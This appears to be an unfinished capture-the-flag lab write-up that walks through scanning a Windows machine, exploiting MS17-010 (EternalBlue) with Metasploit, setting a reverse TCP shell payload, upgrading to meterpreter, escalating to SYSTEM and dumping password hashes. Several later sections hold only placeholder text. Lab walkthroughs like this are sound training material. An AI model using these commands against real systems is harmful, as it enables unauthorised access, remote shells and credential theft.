## Recon

<details>
<summary> How many ports are open with a port number under 1000? </summary>
  <p></p>

____________________________________________________________________________________________________________________  
  
As we are specifying only ports under 1000 we use the following command:
  
``` nmap [ip] -p 0-1000 ```

As seen below, running this command exposes 3 open ports:
  
![image](https://user-images.githubusercontent.com/66912443/186659494-ca27127c-ef59-4279-8c78-4a66e22f1cd9.png)

____________________________________________________________________________________________________________________  
  
</details>

<details>
<summary> What is this machine vulnerable to? </summary>
<p></p>

____________________________________________________________________________________________________________________ 

The script "vuln" is a CVE detection script that helps discover vulnerabilities in the scanned network. It can be activated with the following command:
  
``` nmap [ip] --script vuln ```
  
As seen below it has identified the machine is vulnerable to "ms17-010"
  
![image](https://user-images.githubusercontent.com/66912443/186661668-94728fae-8558-4642-81a8-3cb717ee4798.png)

____________________________________________________________________________________________________________________  
</details>

## Gain Access

<details>
<summary> Find the exploitation code we will run against the machine. What is the full path of the code? </summary>
  <p></p>
  
____________________________________________________________________________________________________________________ 
  
Rapid7 is a great tool for finding vulnerabilities and their uses along with sometimes instructions on how to complete the exploit yourself. Using rapid7.com's Vulnerability and Exploit Database, this vulnerability can be seen in more detail:
  
``` https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/ ```
  
Talking about instructions on how to complete the exploit yourself, at the bottom of the page the first line of code identifies the exploitation code needed to run against the machine!
  
![image](https://user-images.githubusercontent.com/66912443/186663495-0312c1af-22e4-4549-bfbf-563dda2f2670.png)

____________________________________________________________________________________________________________________  
</details>

<details>
<summary> Show options and set the one required value. What is the name of this value? </summary>
  <p></p>

____________________________________________________________________________________________________________________   
``` RHOSTS ``` is the one required value. This is because RHOSTS determines the ip address of the target.

____________________________________________________________________________________________________________________   
  
</details>

<details>
<summary> With that done, run the exploit! </summary>
 
____________________________________________________________________________________________________________________ 

Before running the exploit, make sure to run the following command as by default it will load meterpreter and a follow up question requires converting shell to meterpreter shell.
  
``` set payload windows/x64/shell/reverse_tcp ```
  
Then simply type 'run' and let metaspolit do its thing! If done correctly you will be presented with something similar to the following:
  
![image](https://user-images.githubusercontent.com/66912443/186665440-c9ede66d-7bc3-4245-b47e-a56ceec67727.png)

  
____________________________________________________________________________________________________________________ 

</details>

## Escalate

<details>
<summary> Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? </summary>
  
____________________________________________________________________________________________________________________

Thanks to a post by 'Binamra Pandey' I have learnt the command to convert a shell is as follows: 
   
``` post/multi/manage/shell_to_meterpreter ```
  
<p></p>
  
Source = https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646  
____________________________________________________________________________________________________________________  
</details>

<details>
<summary> Select this (use MODULE_PATH). Show options, what option are we required to change? </summary>
  
____________________________________________________________________________________________________________________ 

``` SESSION ``` is the required option as we need to know which session (that has been backgrounded) to run this exploit on. In my example 'session 2' was backgrounded. 
  
To list all sessions use ``` sessions -l ```
  
![image](https://user-images.githubusercontent.com/66912443/186669104-9eca0c90-a0e7-453b-953b-3fc117fda793.png)


____________________________________________________________________________________________________________________   
  
</details>

<details>
<summary> Run! If this doesn't work, try completing the exploit from the previous task once more. </summary>



</details>

<details>
<summary> Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. </summary>

Any folded content here. It requires an empty line just above it.

</details>

<details>
<summary> List all of the processes running via the 'ps' command. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id </summary>

Any folded content here. It requires an empty line just above it. 

</details>

<details>
<summary> Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. </summary>

Any folded content here. It requires an empty line just above it.

</details>

## Cracking

<details>
<summary> Within our elevated meterpreter shell, run the command 'hashdump'. What is the name of the non-default user? </summary>

Any folded content here. It requires an empty line just above it.

</details>

<details>
<summary> Copy this password hash to a file and research how to crack it. What is the cracked password? </summary>

Any folded content here. It requires an empty line just above it.

</details>

## Find Flags!

<details>
<summary> Flag1? This flag can be found at the system root. </summary>

Any folded content here. It requires an empty line just above it.

</details>

<details>
<summary> Flag2? This flag can be found at the location where passwords are stored within Windows. </summary>

Any folded content here. It requires an empty line just above it.

</details>

<details>
<summary> flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. </summary>

Any folded content here. It requires an empty line just above it.

</details>

